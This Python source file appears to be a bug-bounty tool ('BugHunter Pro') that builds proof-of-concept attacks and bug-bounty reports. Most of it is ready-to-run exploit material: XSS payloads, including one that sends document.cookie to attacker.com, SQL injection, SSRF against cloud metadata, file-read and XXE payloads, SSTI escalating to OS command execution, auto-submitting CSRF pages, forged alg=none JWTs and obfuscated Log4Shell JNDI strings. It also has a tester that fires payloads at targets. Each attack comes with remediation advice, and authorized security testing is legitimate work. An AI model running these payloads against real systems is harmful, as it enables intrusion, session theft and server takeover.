#!/usr/bin/env python3
"""PoC Generator - Proof of Concept for each vulnerability type"""
import requests
import json
import urllib.parse

requests.packages.urllib3.disable_warnings()


class PoCGenerator:

    SUPPORTED_TYPES = {
        'xss', 'sqli', 'ssrf', 'idor', 'lfi', 'rce',
        'xxe', 'ssti', 'csrf', 'open_redirect', 'jwt_none', 'log4shell',
    }

    @staticmethod
    def generate(vuln_type, target, params=None):
        """Generate a PoC for the given vulnerability type."""
        if not vuln_type:
            return {'error': 'vuln_type is required'}

        params = params or {}
        target = target or 'https://target.example.com'

        generators = {
            'xss':           PoCGenerator._poc_xss,
            'sqli':          PoCGenerator._poc_sqli,
            'ssrf':          PoCGenerator._poc_ssrf,
            'idor':          PoCGenerator._poc_idor,
            'lfi':           PoCGenerator._poc_lfi,
            'rce':           PoCGenerator._poc_rce,
            'xxe':           PoCGenerator._poc_xxe,
            'ssti':          PoCGenerator._poc_ssti,
            'csrf':          PoCGenerator._poc_csrf,
            'open_redirect': PoCGenerator._poc_open_redirect,
            'jwt_none':      PoCGenerator._poc_jwt_none,
            'log4shell':     PoCGenerator._poc_log4shell,
        }

        try:
            key = str(vuln_type).lower().replace('-', '_').replace(' ', '_')
        except Exception:
            return {'error': 'Invalid vuln_type value'}

        gen_fn = generators.get(key)
        if not gen_fn:
            return {'error': f'Unknown vulnerability type: {vuln_type}',
                    'supported': sorted(generators.keys())}

        try:
            return gen_fn(target, params)
        except Exception as e:
            return {'error': f'PoC generation failed: {str(e)}', 'type': vuln_type}

    # ──────────────────────────────────────────
    @staticmethod
    def test_poc(vuln_type, target, payload):
        """Safely test a PoC (read-only checks only)."""
        results = {
            'tested': True,
            'vulnerable': False,
            'evidence': '',
            'response_code': None,
        }
        if not vuln_type or not target:
            results['error'] = 'vuln_type and target are required'
            return results

        session = requests.Session()
        session.verify = False
        session.headers.update({'User-Agent': 'Mozilla/5.0 BugHunterPro/2.1 PoC-Tester'})
        payload = payload or ''

        try:
            if vuln_type == 'xss':
                r = session.get(f"{target}?q={urllib.parse.quote(payload)}", timeout=6)
                results['response_code'] = r.status_code
                results['vulnerable'] = payload in r.text
                results['evidence'] = (r.text[:500] if results['vulnerable']
                                       else 'Payload not reflected in response')

            elif vuln_type == 'ssrf_metadata':
                r = session.get(f"{target}?url={urllib.parse.quote(payload)}", timeout=6)
                results['response_code'] = r.status_code
                indicators = ['ami-id', 'instance-id', 'metadata', 'root:x:', 'local-ipv4']
                results['vulnerable'] = any(i in r.text.lower() for i in indicators)
                results['evidence'] = r.text[:300]

            elif vuln_type == 'open_redirect':
                r = session.get(f"{target}?redirect={urllib.parse.quote(payload)}",
                                timeout=5, allow_redirects=False)
                results['response_code'] = r.status_code
                loc = r.headers.get('Location', '')
                results['vulnerable'] = ('evil.com' in loc or payload in loc)
                results['evidence'] = f'Location: {loc}'

            else:
                results['evidence'] = f'Manual verification required for {vuln_type}'

        except requests.exceptions.Timeout:
            results['error'] = 'Request timed out'
        except requests.exceptions.ConnectionError as e:
            results['error'] = f'Connection error: {str(e)[:100]}'
        except Exception as e:
            results['error'] = str(e)

        return results

    # ──────────────────────────────────────────
    # Individual PoC generators
    # ──────────────────────────────────────────
    @staticmethod
    def _poc_xss(target, params):
        param = params.get('param', 'q')
        payload = '<script>alert(document.cookie)</script>'
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'Cross-Site Scripting (XSS)',
            'severity': 'High',
            'cvss': 7.4,
            'cwe': 'CWE-79',
            'target': target,
            'description': "Reflected XSS allows execution of arbitrary JavaScript in victim's browser.",
            'impact': 'Cookie theft, session hijacking, defacement, keylogging, phishing.',
            'payloads': [
                '<script>alert(1)</script>',
                '"><script>alert(document.cookie)</script>',
                '<svg onload=alert(1)>',
                '<img src=x onerror=fetch(`https://attacker.com/steal?c=`+document.cookie)>',
                '"><iframe src="javascript:alert(document.domain)">',
                "'onmouseover='alert(1)",
            ],
            'curl_poc': f'curl -s "{target}?{param}={encoded}" | grep -o "alert.*"',
            'browser_poc': f'{target}?{param}=<script>alert(document.cookie)</script>',
            'python_poc': f'''import requests
target = "{target}"
param  = "{param}"
payload = "<script>alert(document.cookie)</script>"

r = requests.get(target, params={{param: payload}}, verify=False)
if payload in r.text:
    print("[VULNERABLE] Payload reflected in response!")
    print(f"URL: {{r.url}}")
else:
    print("[NOT VULNERABLE] Payload not reflected")
''',
            'html_poc': f'''<!DOCTYPE html>
<html>
<head><title>XSS PoC - BugHunter Pro</title></head>
<body>
  <h2>XSS Proof of Concept</h2>
  <p>Click the link below to trigger the XSS:</p>
  <a href="{target}?{param}={encoded}" target="_blank">
    Trigger XSS ↗
  </a>
</body>
</html>''',
            'burp_request': (f"GET /{param}={encoded} HTTP/1.1\n"
                             f"Host: {urllib.parse.urlparse(target).netloc}\n"
                             f"User-Agent: Mozilla/5.0\n"
                             f"Accept: text/html\n"),
            'remediation': [
                'Encode all user-supplied output (HTML entity encoding).',
                'Use Content-Security-Policy (CSP) header.',
                'Use DOMPurify for any client-side rendering of user data.',
                'Set HttpOnly and Secure flags on session cookies.',
            ],
        }

    @staticmethod
    def _poc_sqli(target, params):
        param = params.get('param', 'id')
        payload = "' OR 1=1--"
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'SQL Injection',
            'severity': 'Critical',
            'cvss': 9.8,
            'cwe': 'CWE-89',
            'target': target,
            'description': 'SQL Injection allows attackers to manipulate database queries.',
            'impact': 'Authentication bypass, data exfiltration, database modification, RCE (via xp_cmdshell / INTO OUTFILE).',
            'payloads': [
                "'",
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND SLEEP(5)--",
                "admin'--",
            ],
            'curl_poc': (f'curl -s "{target}?{param}={encoded}"'
                         f' | grep -iE "error|sql|mysql|syntax"'),
            'python_poc': f'''import requests
target = "{target}"
payloads = ["' OR 1=1--", "' UNION SELECT NULL--", "' AND SLEEP(3)--"]

for payload in payloads:
    r = requests.get(target, params={{"{param}": payload}}, timeout=10, verify=False)
    errors = ["sql syntax", "mysql", "ora-", "sqlite", "pg::"]
    if any(e in r.text.lower() for e in errors):
        print(f"[VULNERABLE] SQL error with payload: {{payload}}")
        break
    print(f"[{{r.status_code}}] {target}?{param}={{payload}}")
''',
            'sqlmap_poc': (f'sqlmap -u "{target}?{param}=1" '
                           f'--dbs --batch --level=3 --risk=2'),
            'remediation': [
                'Use parameterized queries / prepared statements.',
                'Never concatenate user input into SQL strings.',
                'Apply principle of least privilege to DB accounts.',
                'Use an ORM with built-in escaping.',
                'Implement WAF rules for SQL injection patterns.',
            ],
        }

    @staticmethod
    def _poc_ssrf(target, params):
        param = params.get('param', 'url')
        payload = 'http://169.254.169.254/latest/meta-data/'
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'Server-Side Request Forgery (SSRF)',
            'severity': 'Critical',
            'cvss': 9.8,
            'cwe': 'CWE-918',
            'target': target,
            'description': 'SSRF lets an attacker make the server fetch arbitrary internal/external URLs.',
            'impact': 'Cloud metadata theft, internal network access, RCE via metadata credentials.',
            'payloads': [
                'http://169.254.169.254/latest/meta-data/',
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://localhost/',
                'http://127.0.0.1/',
                'http://[::1]/',
                'http://0177.0.0.1/',
                'http://2130706433/',
                'file:///etc/passwd',
                'dict://localhost:6379/info',
                'gopher://127.0.0.1:6379/_INFO',
            ],
            'curl_poc': (f'curl -s "{target}?{param}={encoded}" '
                         f'| grep -i "ami-id\\|instance-id\\|hostname"'),
            'python_poc': f'''import requests
target = "{target}"
payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost/",
]

for payload in payloads:
    try:
        r = requests.get(target, params={{"{param}": payload}}, timeout=5, verify=False)
        indicators = ["ami-id", "instance-id", "metadata", "root:x:", "hostname"]
        if any(i in r.text.lower() for i in indicators):
            print(f"[VULNERABLE] SSRF confirmed with: {{payload}}")
            print(r.text[:500])
            break
        print(f"[{{r.status_code}}] Tested: {{payload[:60]}}")
    except Exception as e:
        print(f"[ERROR] {{e}}")
''',
            'remediation': [
                'Validate and allowlist permitted URL destinations.',
                'Block requests to RFC 1918 / link-local ranges.',
                'Use IMDSv2 (session-oriented metadata service) on AWS.',
                'Disable unnecessary URL-fetching functionality.',
                'Apply network-level egress filtering.',
            ],
        }

    @staticmethod
    def _poc_idor(target, params):
        user_id = params.get('user_id', '<USER_ID>')
        endpoint = params.get('endpoint', '/api/user/{id}')

        return {
            'type': 'Insecure Direct Object Reference (IDOR)',
            'severity': 'High',
            'cvss': 7.5,
            'cwe': 'CWE-639',
            'target': target,
            'description': 'IDOR allows accessing other users\' resources by manipulating object identifiers.',
            'impact': 'Unauthorized data access, privilege escalation, data manipulation.',
            'payloads': [
                '1', '2', '3', '0', '-1',
                '00000000-0000-0000-0000-000000000001',
                'admin', '../admin',
                '1 OR 1=1',
            ],
            'curl_poc': (f'# Test sequential IDs\n'
                         f'for i in 1 2 3 4 5; do\n'
                         f'  curl -s -H "Authorization: Bearer YOUR_TOKEN" \\\n'
                         f'    "{target}{endpoint.replace("{id}", "$i")}"\n'
                         f'done'),
            'python_poc': f'''import requests

target = "{target}"
token  = "YOUR_JWT_OR_SESSION_TOKEN"
headers = {{"Authorization": f"Bearer {{token}}"}}

# Test sequential IDs
for user_id in range(1, 10):
    url = f"{{target}}/api/user/{{user_id}}"
    r = requests.get(url, headers=headers, verify=False)
    if r.status_code == 200:
        data = r.json() if r.headers.get("content-type","").startswith("application/json") else {{}}
        sensitive = [k for k in ["email","username","phone","ssn","token"] if k in r.text.lower()]
        if sensitive:
            print(f"[IDOR] user_id={{user_id}} exposes: {{sensitive}}")
        else:
            print(f"[{{r.status_code}}] user_id={{user_id}}")
''',
            'remediation': [
                'Implement object-level authorization (OLA) checks.',
                'Verify the requesting user owns the resource before returning data.',
                'Use UUIDs instead of sequential integers where possible.',
                'Log and alert on bulk enumeration patterns.',
            ],
        }

    @staticmethod
    def _poc_lfi(target, params):
        param = params.get('param', 'file')
        payload = '../../../../etc/passwd'
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'Local File Inclusion (LFI)',
            'severity': 'High',
            'cvss': 7.5,
            'cwe': 'CWE-22',
            'target': target,
            'description': 'LFI allows reading arbitrary files from the server filesystem.',
            'impact': 'Source code disclosure, credential theft, log poisoning → RCE.',
            'payloads': [
                '../../../../etc/passwd',
                '....//....//....//etc/passwd',
                '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                '/proc/self/environ',
                '/var/log/apache2/access.log',
            ],
            'curl_poc': (f'curl -s "{target}?{param}={encoded}" '
                         f'| grep -E "root:|daemon:|www-data:"'),
            'python_poc': f'''import requests, base64

target = "{target}"
payloads = [
    "../../../../etc/passwd",
    "php://filter/read=convert.base64-encode/resource=index.php",
    "/proc/self/environ",
]

for payload in payloads:
    r = requests.get(target, params={{"{param}": payload}}, verify=False, timeout=5)
    if "root:" in r.text or r.text.startswith("cm9vd"):  # base64 of "root"
        print(f"[LFI CONFIRMED] {{payload}}")
        if r.text.startswith("cm9vd"):
            print(base64.b64decode(r.text.strip()).decode(errors="replace")[:500])
        else:
            print(r.text[:500])
        break
''',
            'remediation': [
                'Use a whitelist of permitted file names/paths.',
                'Resolve and validate the canonical path (realpath) before opening.',
                'Disable PHP allow_url_include and allow_url_fopen.',
                'Run the application with minimal filesystem permissions.',
            ],
        }

    @staticmethod
    def _poc_rce(target, params):
        param = params.get('param', 'cmd')
        payload = '; id'

        return {
            'type': 'Remote Code Execution (RCE)',
            'severity': 'Critical',
            'cvss': 9.8,
            'cwe': 'CWE-78',
            'target': target,
            'description': 'RCE allows executing arbitrary OS commands on the server.',
            'impact': 'Full server compromise, data theft, lateral movement, ransomware.',
            'payloads': [
                '; id',
                '| id',
                '& id',
                '; cat /etc/passwd',
                '`id`',
                '$(id)',
                '; curl http://169.254.169.254/',
                '|| id',
                '&& id',
                '; sleep 5',
            ],
            'curl_poc': (f'curl -s "{target}?{param}={urllib.parse.quote(payload)}" '
                         f'| grep -E "uid=|gid="'),
            'python_poc': f'''import requests

target  = "{target}"
canary  = "uid="
payloads = ["; id", "| id", "& id", "`id`", "$(id)"]

for payload in payloads:
    r = requests.get(target, params={{"{param}": payload}}, verify=False, timeout=6)
    if canary in r.text:
        print(f"[RCE CONFIRMED] payload={{payload!r}}")
        print(r.text[:300])
        break
    print(f"[{{r.status_code}}] Tested {{payload!r}}")
''',
            'remediation': [
                'Never pass user input to OS command execution functions.',
                'Use subprocess with argument lists (no shell=True).',
                'Validate and whitelist any inputs that interact with system commands.',
                'Run application processes with least-privilege OS users.',
                'Apply AppArmor / seccomp profiles in production.',
            ],
        }

    @staticmethod
    def _poc_xxe(target, params):
        endpoint = params.get('endpoint', '/api/xml')
        xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>'''

        return {
            'type': 'XML External Entity (XXE)',
            'severity': 'High',
            'cvss': 8.2,
            'cwe': 'CWE-611',
            'target': target,
            'description': 'XXE allows reading local files or triggering SSRF via XML parsing.',
            'impact': 'File disclosure, SSRF, DoS via billion-laughs, internal port scanning.',
            'payloads': [
                xxe_payload,
                '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>''',
                '''<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><test></test>''',
            ],
            'curl_poc': (f"curl -s -X POST '{target}{endpoint}' \\\n"
                         f"  -H 'Content-Type: application/xml' \\\n"
                         f"  -d '{xxe_payload.splitlines()[0]}...' \\\n"
                         f"  | grep -E 'root:|daemon:'"),
            'python_poc': f'''import requests

target  = "{target}"
endpoint = "{endpoint}"
payload = """<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>"""

r = requests.post(target + endpoint,
                  data=payload,
                  headers={{"Content-Type": "application/xml"}},
                  verify=False, timeout=8)
if "root:" in r.text:
    print("[XXE CONFIRMED] /etc/passwd contents:")
    print(r.text[:500])
else:
    print(f"[{{r.status_code}}] Not vulnerable (or mitigated)")
''',
            'remediation': [
                'Disable external entity processing in your XML parser.',
                'Use less complex data formats (JSON) where XML is not required.',
                'Upgrade XML libraries to versions with secure-by-default settings.',
                'Use SAST tools to detect XML parser misconfigurations.',
            ],
        }

    @staticmethod
    def _poc_ssti(target, params):
        param = params.get('param', 'name')
        payload = '{{7*7}}'
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'Server-Side Template Injection (SSTI)',
            'severity': 'Critical',
            'cvss': 9.8,
            'cwe': 'CWE-94',
            'target': target,
            'description': 'SSTI allows injecting template directives that execute on the server.',
            'impact': 'RCE, full server compromise, information disclosure.',
            'payloads': [
                '{{7*7}}',
                '${7*7}',
                '<%= 7*7 %>',
                '{{config}}',
                "{{''.__class__.__mro__[2].__subclasses__()}}",
                '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
                '${\"freemarker.template.utility.Execute\"?new()(\"id\")}',
            ],
            'curl_poc': (f'curl -s "{target}?{param}={encoded}" '
                         f'| grep -E "^49$|49<"'),
            'python_poc': f'''import requests

target  = "{target}"
probes  = [("{{{{7*7}}}}", "49"), ("${{7*7}}", "49"), ("<%= 7*7 %>", "49")]

for payload, expected in probes:
    r = requests.get(target, params={{"{param}": payload}}, verify=False, timeout=5)
    if expected in r.text:
        print(f"[SSTI CONFIRMED] Template engine executed: {{payload}} → {{expected}}")
        # Escalate to RCE
        rce_payload = "{{{{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}}}"
        r2 = requests.get(target, params={{"{param}": rce_payload}}, verify=False, timeout=5)
        print("RCE attempt:", r2.text[:200])
        break
''',
            'remediation': [
                'Never render user-supplied data directly in templates.',
                'Use sandboxed template environments.',
                'Apply input validation / allowlisting for template parameters.',
                'Use Jinja2 with sandbox=True or equivalent.',
            ],
        }

    @staticmethod
    def _poc_csrf(target, params):
        endpoint = params.get('endpoint', '/api/change-email')
        method = params.get('method', 'POST').upper()

        return {
            'type': 'Cross-Site Request Forgery (CSRF)',
            'severity': 'Medium',
            'cvss': 6.5,
            'cwe': 'CWE-352',
            'target': target,
            'description': 'CSRF tricks authenticated users into making unwanted requests.',
            'impact': 'Account takeover, unauthorized actions on behalf of victim.',
            'payloads': [
                f'<form action="{target}{endpoint}" method="{method}"><input name="email" value="attacker@evil.com"><input type="submit" value="Click me"></form>',
                f'<img src="{target}/api/transfer?to=attacker&amount=1000">',
            ],
            'html_poc': f'''<!DOCTYPE html>
<html>
<head><title>CSRF PoC - BugHunter Pro</title></head>
<body onload="document.forms[0].submit()">
  <form action="{target}{endpoint}" method="{method}">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="action" value="update">
  </form>
  <p>You have been redirected. Please wait...</p>
</body>
</html>''',
            'curl_poc': (f'curl -X {method} "{target}{endpoint}" \\\n'
                         f'  -H "Cookie: session=VICTIM_SESSION" \\\n'
                         f'  -d "email=attacker%40evil.com"'),
            'python_poc': f'''import requests

# Simulate victim's session
session = requests.Session()
session.cookies.set("session", "VICTIM_SESSION_TOKEN")

r = session.{method.lower()}("{target}{endpoint}",
    data={{"email": "attacker@evil.com"}},
    verify=False)
print(f"[{method}] {target}{endpoint} → {{r.status_code}}")
if r.status_code in [200, 302]:
    print("[CSRF] Request succeeded without CSRF token!")
''',
            'remediation': [
                'Implement CSRF tokens (synchronizer token pattern).',
                'Use SameSite=Strict or SameSite=Lax cookie attribute.',
                'Verify Origin and Referer headers for state-changing requests.',
                'Require re-authentication for sensitive actions.',
            ],
        }

    @staticmethod
    def _poc_open_redirect(target, params):
        param = params.get('param', 'redirect')
        payload = 'https://evil.com'
        encoded = urllib.parse.quote(payload)

        return {
            'type': 'Open Redirect',
            'severity': 'Medium',
            'cvss': 5.4,
            'cwe': 'CWE-601',
            'target': target,
            'description': 'Open redirect allows attackers to redirect users to arbitrary external URLs.',
            'impact': 'Phishing, OAuth token theft, bypassing referrer checks.',
            'payloads': [
                'https://evil.com',
                '//evil.com',
                '/\\evil.com',
                'https://evil.com%23',
                f'https://evil.com@{urllib.parse.urlparse(target).netloc}',
                'javascript:alert(document.domain)',
            ],
            'curl_poc': (f'curl -I "{target}?{param}={encoded}" '
                         f'| grep -i location'),
            'browser_poc': f'{target}?{param}=https://evil.com',
            'python_poc': f'''import requests

target = "{target}"
payloads = [
    "https://evil.com",
    "//evil.com",
    "/\\\\evil.com",
    "https://evil.com%23",
]

for payload in payloads:
    r = requests.get(f"{{target}}?{param}={{payload}}",
                     allow_redirects=False, verify=False, timeout=5)
    loc = r.headers.get("Location", "")
    if "evil.com" in loc:
        print(f"[OPEN REDIRECT] {param}={{payload}} → {{loc}}")
        break
    print(f"[{{r.status_code}}] {param}={{payload}} → {{loc or 'no redirect'}}")
''',
            'remediation': [
                'Use a whitelist of permitted redirect destinations.',
                'For internal redirects, use relative paths only.',
                'Reject redirects containing absolute URLs or protocol-relative URLs.',
                'Log redirect attempts to external domains.',
            ],
        }

    @staticmethod
    def _poc_jwt_none(target, params):
        import base64

        header = base64.urlsafe_b64encode(
            b'{"alg":"none","typ":"JWT"}'
        ).rstrip(b'=').decode()
        payload_b64 = base64.urlsafe_b64encode(
            b'{"sub":"admin","role":"admin","iat":1700000000}'
        ).rstrip(b'=').decode()
        malicious_token = f"{header}.{payload_b64}."

        return {
            'type': 'JWT None Algorithm Attack',
            'severity': 'Critical',
            'cvss': 9.1,
            'cwe': 'CWE-345',
            'target': target,
            'description': 'JWT "none" algorithm bypass allows forging tokens without a valid signature.',
            'impact': 'Authentication bypass, privilege escalation, impersonation of any user.',
            'payloads': [
                malicious_token,
                'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.',
            ],
            'malicious_token': malicious_token,
            'curl_poc': (f'curl -s -H "Authorization: Bearer {malicious_token}" '
                         f'"{target}/api/admin" | jq .'),
            'python_poc': f'''import base64, requests

def forge_jwt(payload_dict):
    """Forge a JWT with alg=none (no signature)."""
    import json
    header  = base64.urlsafe_b64encode(json.dumps({{"alg":"none","typ":"JWT"}}).encode()).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b"=").decode()
    return f"{{header}}.{{payload}}."

token = forge_jwt({{"sub": "admin", "role": "admin", "iat": 1700000000}})
print(f"Forged token: {{token}}")

headers = {{"Authorization": f"Bearer {{token}}"}}
r = requests.get("{target}/api/admin", headers=headers, verify=False)
print(f"[{{r.status_code}}] Response: {{r.text[:300]}}")
if r.status_code == 200:
    print("[VULNERABLE] JWT none algorithm accepted!")
''',
            'remediation': [
                'Reject tokens where alg is "none" or "NONE".',
                'Use a fixed algorithm in the verification step (do not trust the header alg).',
                'Use strong secret keys (≥256 bits) for HS256 or asymmetric keys for RS256.',
                'Validate all JWT claims (iss, aud, exp, nbf).',
            ],
        }

    @staticmethod
    def _poc_log4shell(target, params):
        cb_host = params.get('callback_host', 'your-collaborator.burpcollaborator.net')
        payload = f'${{jndi:ldap://{cb_host}/exploit}}'
        headers_to_test = [
            'User-Agent',
            'X-Forwarded-For',
            'X-Api-Version',
            'Referer',
            'Accept-Language',
            'Cookie',
        ]

        return {
            'type': 'Log4Shell (CVE-2021-44228)',
            'severity': 'Critical',
            'cvss': 10.0,
            'cwe': 'CWE-917',
            'target': target,
            'description': (
                'Log4Shell is a critical RCE in Apache Log4j 2.x via JNDI lookup injection. '
                'When Log4j logs a user-controlled string, it triggers an outbound LDAP/DNS lookup.'
            ),
            'impact': 'Unauthenticated Remote Code Execution on any server running Log4j 2.0-2.14.',
            'payloads': [
                payload,
                '${jndi:ldap://attacker.com/a}',
                '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://attacker.com/a}',
                '${${lower:j}ndi:${lower:ldap}://attacker.com/a}',
                '${${::-j}ndi:dns://attacker.com}',
            ],
            'curl_poc': '\n'.join([
                f'curl -s -H "{hdr}: {payload}" "{target}" &'
                for hdr in headers_to_test
            ]) + f'\n# Check {cb_host} for DNS/HTTP callbacks',
            'python_poc': f'''import requests

target   = "{target}"
cb_host  = "{cb_host}"   # Replace with your Burp Collaborator / interactsh host
payload  = f"${{{{jndi:ldap://{{cb_host}}/exploit}}}}"

headers_to_inject = {headers_to_test}

print(f"Testing Log4Shell - monitor {{cb_host}} for callbacks")
for header in headers_to_inject:
    try:
        r = requests.get(target, headers={{header: payload}},
                         timeout=5, verify=False)
        print(f"[{{r.status_code}}] Tested header: {{header}}")
    except Exception as e:
        print(f"[ERROR] {{header}}: {{e}}")

print("\\n[!] If you receive a DNS/HTTP callback on your server, the target is VULNERABLE.")
print("[!] Remediation: Update Log4j to >= 2.17.1")
''',
            'remediation': [
                'Update Log4j to >= 2.17.1 (Java 8) or >= 2.12.4 (Java 7).',
                'Set LOG4J_FORMAT_MSG_NO_LOOKUPS=true environment variable.',
                'Remove JndiLookup.class from log4j-core JAR.',
                'Apply WAF rules to block ${jndi: patterns.',
                'Upgrade Java to >= 8u191 or 11.0.1 (disables remote class loading).',
            ],
        }


# ──────────────────────────────────────────
class ReportGenerator:

    @staticmethod
    def generate(scan_id, findings, scan_info, report_format='hackerone'):
        if not isinstance(findings, list):
            findings = []
        if not isinstance(scan_info, dict):
            scan_info = {}

        fmt_map = {
            'hackerone': ReportGenerator._hackerone_format,
            'bugcrowd':  ReportGenerator._bugcrowd_format,
            'markdown':  ReportGenerator._markdown_format,
            'json':      ReportGenerator._json_format,
        }
        fn = fmt_map.get(report_format)
        if not fn:
            return {'error': f'Unknown format: {report_format}',
                    'supported': list(fmt_map.keys())}
        try:
            return fn(scan_id, findings, scan_info)
        except Exception as e:
            return {'error': f'Report generation failed: {str(e)}'}

    @staticmethod
    def _hackerone_format(scan_id, findings, scan_info):
        target = scan_info.get('target', 'Unknown')
        reports = []

        for finding in findings:
            if finding.get('severity', '').lower() not in ['critical', 'high', 'medium']:
                continue

            remediation = finding.get('remediation', 'See OWASP guidance')
            if isinstance(remediation, list):
                rem_text = '\n'.join(f'- {r}' for r in remediation)
            else:
                rem_text = f'- {remediation}'

            poc_text = (finding.get('poc') or finding.get('curl_poc') or
                        finding.get('python_poc') or 'See evidence below')

            reports.append({
                'title': (f"[{finding.get('severity','HIGH').upper()}] "
                          f"{finding.get('type','Vulnerability')} in "
                          f"{finding.get('target', target)}"),
                'severity': finding.get('severity', 'high').lower(),
                'weakness': finding.get('type', 'Security Misconfiguration'),
                'cvss_score': finding.get('cvss', 0),
                'steps_to_reproduce': f"""
## Steps to Reproduce

1. Navigate to: `{finding.get('target', target)}`
2. Execute:

```bash
{poc_text}
```

3. Observe:
```
{finding.get('evidence', 'See description')}
```

## Impact

{finding.get('description', 'Security vulnerability detected')}

**Affected Parameter:** `{finding.get('parameter', 'N/A')}`
**CVSS Score:** {finding.get('cvss', 'N/A')}
**CWE:** {finding.get('cwe', 'N/A')}

## Remediation

{rem_text}

## Metadata

- Scan ID: {scan_id}
- Timestamp: {finding.get('timestamp', '')}
- Tool: BugHunter Pro v2.1
""",
                'metadata': {
                    'scan_id': scan_id,
                    'tool': 'BugHunter Pro v2.1',
                    'timestamp': finding.get('timestamp', ''),
                },
            })

        return {'format': 'hackerone', 'reports': reports, 'total': len(reports)}

    @staticmethod
    def _markdown_format(scan_id, findings, scan_info):
        target = scan_info.get('target', 'Unknown')
        sev_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0, 'info': 0}
        for f in findings:
            sev = f.get('severity', 'info').lower()
            sev_count[sev] = sev_count.get(sev, 0) + 1

        md = f"""# Bug Bounty Report — {target}

**Scan ID:** {scan_id}
**Target:** {target}
**Date:** {scan_info.get('start_time', 'N/A')}
**Tool:** BugHunter Pro v2.1

---

## Executive Summary

Total findings: **{len(findings)}**

| Severity | Count |
|----------|-------|
"""
        for sev, count in sev_count.items():
            if count > 0:
                md += f"| {sev.upper()} | {count} |\n"

        md += "\n---\n\n## Findings\n\n"
        sev_emoji = {
            'CRITICAL': '🔴', 'HIGH': '🟠', 'MEDIUM': '🟡', 'LOW': '🟢', 'INFO': '🔵'
        }

        for i, f in enumerate(findings, 1):
            sev = f.get('severity', 'info').upper()
            emoji = sev_emoji.get(sev, '⚪')
            remediation = f.get('remediation', 'See OWASP guidance')
            if isinstance(remediation, list):
                rem_text = '\n'.join(f'- {r}' for r in remediation)
            else:
                rem_text = f'- {remediation}'
            poc = (f.get('poc') or f.get('curl_poc') or f.get('python_poc') or 'N/A')

            md += f"""### {i}. {emoji} [{sev}] {f.get('type', 'Vulnerability')}

**Target:** `{f.get('target', target)}`
**CVSS:** {f.get('cvss', 'N/A')} | **CWE:** {f.get('cwe', 'N/A')}

#### Description
{f.get('description', 'N/A')}

#### Evidence
```
{f.get('evidence', 'N/A')}
```

#### Proof of Concept
```bash
{poc}
```

#### Remediation
{rem_text}

---

"""
        return {'format': 'markdown', 'content': md, 'length': len(md)}

    @staticmethod
    def _bugcrowd_format(scan_id, findings, scan_info):
        target = scan_info.get('target', 'Unknown')
        reports = []
        for finding in findings:
            remediation = finding.get('remediation', 'See OWASP guidance')
            if isinstance(remediation, list):
                remediation = '\n'.join(f'- {r}' for r in remediation)
            reports.append({
                'title': finding.get('type', 'Security Issue'),
                'severity': finding.get('severity', 'low'),
                'target': finding.get('target', target),
                'description': finding.get('description', ''),
                'reproduction_steps': finding.get('evidence', ''),
                'poc': (finding.get('poc') or finding.get('curl_poc') or ''),
                'remediation': remediation,
                'cvss': finding.get('cvss', 0),
            })
        return {'format': 'bugcrowd', 'reports': reports, 'total': len(reports)}

    @staticmethod
    def _json_format(scan_id, findings, scan_info):
        return {
            'format': 'json',
            'scan_id': scan_id,
            'scan_info': scan_info,
            'findings': findings,
            'summary': {
                'total': len(findings),
                'critical': len([f for f in findings if f.get('severity') == 'critical']),
                'high': len([f for f in findings if f.get('severity') == 'high']),
                'medium': len([f for f in findings if f.get('severity') == 'medium']),
                'low': len([f for f in findings if f.get('severity') == 'low']),
                'info': len([f for f in findings if f.get('severity') == 'info']),
            },
        }
